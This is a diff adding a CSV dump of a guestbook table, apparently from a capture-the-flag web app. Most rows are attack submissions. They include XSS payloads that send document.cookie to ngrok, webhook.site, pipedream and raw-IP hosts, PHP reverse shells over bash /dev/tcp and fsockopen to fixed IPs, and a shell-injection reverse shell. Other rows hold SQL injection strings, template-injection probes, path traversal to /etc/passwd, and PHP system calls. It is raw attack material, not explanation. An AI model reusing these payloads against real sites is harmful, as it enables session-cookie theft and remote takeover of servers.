@@ -1,0 +1,241 @@
+id,name,entry
+1,a,a
+2,l,"<script>console.log(""Hey"")</script A"
+3,abc,"<script>console.log(""Hey"")</script>"
+4,dwdw,dwdw
+5,mmm,<B>hmm</B>
+6,{{2*2}},{{2*2}}
+7,GIVE ME THE FLAG,GIVE ME THE FLAG
+8,mmm,<B>hmm</B>
+9,billy,<i>bob</i>
+10,<img src=x onerror=this.src='http://563a-2409-4072-286-bae8-8bea-8b46-ca6b-1553.ngrok.io/?'+document.cookie;>,<img src=x onerror=this.src='http://563a-2409-4072-286-bae8-8bea-8b46-ca6b-1553.ngrok.io/?'+document.cookie;>
+11,blah,blah
+12,mmm,<?php%20phpinfo();>
+13,test,"<script>console.log(""Hey"")</script>"
+14,<blank>,{{2*2}}
+15,a,{{constructor.constructor('alert(1)')()}}
+16,a,<a href=[javascript&':alert(1)']>test</a>
+17,','
+18,"<script>fetch(""http://http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie)</script>","<script>fetch(""http://http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie)</script>"
+19,a,"<a href=""http://http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie>test</a>"
+20,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie;>"
+21,ZAP,ZAP
+22,ZAP,ZAP
+23,ZAP,ZAP
+24,ZAP,ZAP
+25,ZAP,ZAP
+26,ZAP,ZAP
+27,ZAP,ZAP
+28,ZAP,ZAP
+29,ZAP,ZAP
+30,ZAP,ZAP
+31,ZAP,ZAP
+32,../../../../../../../../../../../../../../../../Windows/system.ini,ZAP
+33,/guestbook.php,ZAP
+34,ZAP,/etc/passwd
+35,hey,bululu
+36,mmm,"<img src=x onerror=this.src=""http://350c-50-66-181-212.ngrok.io>/?c=""+document.cookie>"
+37,test,test
+38,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>
+39,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>
+40,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c='+document.cookie>
+41,</noscript>,hey
+42,1' + sleep(10),1' + sleep(10)
+43,' 1=1 --,' 1=1 --
+44,</noscript><script>alert(3)</script>,hey
+45,test,test
+46,test,test
+47,/guestbook.php,/guestbook.php
+48,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>
+49,</noscript><script>alert(3)</script>,</noscript><script>alert(3)</script>
+50,{{2*2}},{{2*2}}
+51,{{2*2}},{{2*2}}
+52,</noscript><script>alert(3)</script>,</noscript><script>alert(4)</script>
+53,\\\\\\\\,\\\\\\\\
+54,test,test
+55,</noscript><script>alert(3)</script,</noscript><script>alert(3)</script
+56,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c='<?php phpinfo();?>>
+57,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c='+/windows/system.i
+58,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c=' + fetch(/windows/system.i)>
+59,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""<?php phpinfo();?>>"
+60,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""<?php phpinfo();?>>"
+61,a,document.getElementsByTagName(â\x80\x9ch2â\x80\x9d)[2].innerHTML = â\x80\x9cPentested by @int0x33â\x80\x9d;
+62,tes,tes
+63,system,ls
+64,tes,tes
+65,mmm,<iframe src=/Windows/system.i/>
+66,mmm,<iframe src=/Windows/system.i>
+67,mmm,<iframe src=/etc/passwd>
+68,mmm,<iframe src=/login.php>
+69,mmm,"<?php echo file_get_contents(""login.php""); ?>"
+70,bcngGCN,HCV
+71,bcngGCN,{{ls -la}}
+72,{{2*2}},{{2*2}}
+73,{{2*2}},{{2*2}}
+74,mmm,"<?php system(""whoami""); ?>"
+75,mmm,"<?php system(""whoami""); ?>"
+76,aa,bbbb
+77,z,"<img src=""x"" onerror=""document.write(window.location)"" />"
+78,asdas,/login.php
+79,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
+80,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
+81,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
+82,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
+83,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
+84,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
+85,"<img src=x onerror=this.src=""https://webhook.site/4881fad2-f1a7-4af7-95b9-9f37a4e9bf5b/?c=""+document.cookie;> ","<img src=x onerror=this.src=""https://webhook.site/4881fad2-f1a7-4af7-95b9-9f37a4e9bf5b/?c=""+document.cookie;> "
+86,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>","<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
+87,a,a
+88,'; -- ,hello
+89,a,test
+90,a,test
+91,'; --,'; --
+92,xy,'; --
+93,xy,"<img src=x onerror=this.src=""https://webhook.site/4881fad2-f1a7-4af7-95b9-9f37a4e9bf5b/?c=""+document.cookie;> "
+94, 1' + sleep(10), 1' + sleep(10)
+95, 1' + sleep(10), 1' + sleep(10)
+96, 1' + sleep(10), 1' + sleep(10)
+97,bruh,"<?php system(""whoami""); ?>"
+98,bruh,<?php var_dump(phpinfo()); ?>
+99,test,<?php phpinfo(); ?>
+100,test,<?php phpinfo(); ?>
+101,test,<?php phpinfo(); ?>
+102,test,{{2*2}}
+103,test,<B>hmm</B>
+104,test,<?php phpinfo();>
+105,test,<?php echo'hello';>
+106,test,?php echo'hello';
+107,test,<?php echo'hello';
+108,test,<?php echo'hello';>
+109,test,"<?php echo file_get_contents(""login.php""); ?>"
+110,test,"<?php echo ""bru""; ?>hi"
+111,a,<?php phpinfo(); ?>
+112,test,"<?php exec(""/bin/bash -c \\'bash -i > /dev/tcp/82.12.44.94/7777 0>"
+113,test,<?php phpinfo(); ?>
+114,test,"<?php exec(""/bin/bash -c \\'bash -i \\\\> /dev/tcp/82.12.44.94/7777 0\\\\>"
+115,test,<?php exec('/bin/bash -c 'bash -i \\\\> /dev/tcp/82.12.44.94/7777 0\\\\>
+116,test,<?php exec('/bin/bash -c 'bash -i > /dev/tcp/82.12.44.94/7777 0>
+117,test,"<?php $sock=fsockopen(""82.12.44.94"",7777);passthru(""/bin/sh -i <"
+118,test,"<?php $sock=fsockopen(""82.12.44.94"",7777); >hi"
+119,test,"<?php $sock=fsockopen(""82.12.44.94"",7777); >hi"
+120,'+user()+','+user()+'
+121,test,'+user()+'
+122,test,{{7*7}}
+123,test,<script>fetch('http://46.137.44.41:8000?x='+document.cookie)</script>
+124,<script>fetch('http://46.137.44.41:8000?x='+document.cookie)</script>,test
+125,test,<?php phpinfo();>
+126,test,<?php phpinfo();?>
+127,a,a
+128,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99>,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99>
+129,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99>,test
+130,test,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99?webhook>
+131,test,"<img src=""https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99?test"">"
+132,test,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
+133,{{2*2}},{{2*2}}
+134,a,"<img src=""https://webhook.site/23625f3f-c9e2-4ab9-89eb-2e187bcce7cb"">"
+135,"<img src=""c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />","<img src=""c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />"
+136,"<img src=""http://c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />","<img src=""http://c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />"
+137,<?php phpinfo();?>,<?php phpinfo();?>
+138,<script>test</script>,<script>test</script>
+139,"<script type=""text/javascript"">document.location=""http://21ae-213-134-179-47.ngrok.io/?c=""+document.cookie;</script>","<script type=""text/javascript"">document.location=""http://21ae-213-134-179-47.ngrok.io/?c=""+document.cookie;</script>"
+140,fd,fd
+141,<?php phpinfo();?>,<?php phpinfo();?>
+142,sadasd,dasdasd
+143,1' + sleep(10),1' + sleep(10)
+144,"<?php system(""whoami""); ?>","<?php system(""whoami""); ?>"
+145,<?php exec('/bin/bash -c 'bash -i > /dev/tcp/82.12.44.94/7777 0>,<?php exec('/bin/bash -c 'bash -i > /dev/tcp/82.12.44.94/7777 0>
+146,a,{{2*2}}
+147,fds,{{2*2}}
+148,fds,"<script>console.log(""Hey"")</script>"
+149,a,<script>alert(1)</script>
+150,a,<script><?php echo phpinfo();?></script>
+151,a,<script><?php $GET['login.php];?></script>
+152,a,<script><?php $_GET[*];?></script>
+153,a,{{7*'7'}}
+154,a,{{dump(app)}}
+155,a,<%= 7*7 %>
+156,a,${{7*7}}
+157,a,${7*7}
+158,fk,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.getElementsByClassName(\\'STAGING_COLUMN\\'))</script>"
+159,fk,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.getElementsByClassName(\\'STAGING_COLUMN\\').text)</script>"
+160,fk,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.domain)</script>"
+161,fd,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.domain)</script>"
+162,fds,"<script>console.log(""Hey"")</script>"
+163,fds,"<script>console.log(""Hey"")</script>"
+164,fd,"<script>window.location=""https://webhook.site/1f8d9fa6-50c0-4dad-a896-0852637a3cc2?c="".concat(document.getElementsByClassName(\\'STAGING_COLUMN\\').text)</script>"
+165,fds,"<?php exec(""/bin/bash -c \\'bash -i > /dev/tcp/82.12.44.94/7777 0>"
+166, 1' + sleep(10), 1' + sleep(10)
+167,1' + sleep(10),1' + sleep(10)
+168,adf,<script>fetch('http://5e44-50-66-181-212.ngrok.io/c.png')</script>
+169,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie;>"
+170,a,<script>fetch('http://2b09-50-66-181-212.ngrok.io/c.png'+<?php echo(phpinfo());?>)</script>
+171,a,<script>fetch('http://2b09-50-66-181-212.ngrok.io/c.png'+<?php echo(phpinfo());?>)</script>
+172,a,"<script><?php echo ""<?php file_put_contents(\\'nameOfFile\\', fopen(\\'http://192.168.1.102/file\\', \\'r\\')); ?>"" > down2.php;></script>"
+173,b,; bash -i >& /dev/tcp/3.129.187.220/14270 0>&1
+174,fd,"<?php exec(""/bin/bash -c \\'bash -i > /dev/tcp/3.129.187.220/14270 0>"
+175,a,"<?php $output = `whoami`; echo ""<pre>$output</pre>""; ?>"
+176,d,<?php echo(phpinfo());?>
+177,a,<script><?php echo(phpinfo());?></script>
+178,a,<script><?php echo(phpinfo());?></script>
+179,a,"<script><?php echo(""test"");?></script>"
+180,a,"<script><?php echo(""test"");?></script>"
+181,f,"<script>console.log(""Hey"")</script>"
+182,f,"<script>console.log(""Hey"")</script>"
+183,a,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
+184,test,'
+185,test,"\\'""><img src=x onerror=alert(1);>"
+186,test,"<?php echo(system(""ls"")); ?>"
+187,test,"""><?php echo(system(""ls"")); ?>"
+188,test,"""><img src=x onerror=alert(document.cookie);>"
+189,test,"""><img src=flag.txt onerror=alert(document.cookie);>"
+190,test,"""><img src=x onerror=alert(document.cookie);>"
+191,person,i'm a person
+192,' or True,<blank>
+193,' or True,<blank>
+194,<blank>,' or True /*
+195,whoami'--!,<blank>
+196,test,test
+197,aa,"""><img src=x onerror=alert(document.cookie);>"
+198,aa,"""><img src=x onerror=alert(document.cookie);>"
+199,whoami'--!,<blank>
+200,"<?php echo(system(""ls"")); ?>",<blank>
+201,<blank>,"<?php echo(system(""ls"")); ?>"
+202,"""><?php echo(system(""ls"")); ?>","""><?php echo(system(""ls"")); ?>"
+203,"""><?php echo(system(""ls"")); ?>","""><?php echo(system(""ls"")); ?>"
+204,test,"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>"
+205,s,<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+206,Admin,&lt;iframe src=/flag.php&gt;
+207,<blank>,"<script>console.log(""Hey"")</script>"
+208,<blank>,<iframe src=/flag.php>
+209,<blank>,<iframe src=/flag.php>
+210,<blank>,<iframe src=/flag.txt>
+211,<blank>,<iframe src=/etc/passwd>
+212,<blank>,<iframe src=/login.php>
+213,<blank>,<iframe src=/guessbook.php>
+214,<blank>,<iframe src=/127.0.0.1>
+215,<blank>,<iframe src=/127.0.0.1>
+216,<blank>,<iframe src=/referral.php>
+217,<blank>,<iframe src=/referral.phps>
+218,<blank>,<iframe src=/flag.php>
+219,<blank>,"<script type=""text/javascript"">document.location=""https://hookb.in/JK0waGPy30hg0l990W7G?c"" document.cookie;</script>"
+220,<blank>,<iframe src=/etc/passwd> 
+221,aaaaa,aaaa
+222,<blank>,"<?php system(""whoami""); ?>"
+223,Admin,"<script type=""text/javascript""> document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c=""+document.cookie; </script>"
+224,<blank>,"<<script type=""text/javascript"">document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c="" document.cookie;</script>"
+225,<blank>,"<script type=""text/javascript"">document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c="" document.cookie;</script>"
+226,<blank>,{{1**3}}
+227,<blank>,;ls
+228,<blank>,"<script>alert(""1"")</script>"
+229,<blank>,"<script>alert(""1"");</script>"
+230,<blank>,<%= %>
+231,<blank>,${7*7}
+232,<blank>,<%= 7*7 %>
+233,<blank>,{{7*7}}
+234,<blank>,"<?php $output = `whoami`; echo ""<pre>$output</pre>""; ?> "
+235,<blank>,"<script type=""text/javascript""> document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c=""+document.cookie; </script>"
+236,<blank>,<blank>
+237,<blank>,"<script type=""text/javascript"">document.location=""https://en725atwk2i7ihv.m.pipedream.net/?c="" document.cookie;</script>"
+238,<blank>,"<?php $output = `whoami`; echo ""<pre>$output</pre>""; ?> "
+239,<blank>,<?php echo `whoami`?> 
+
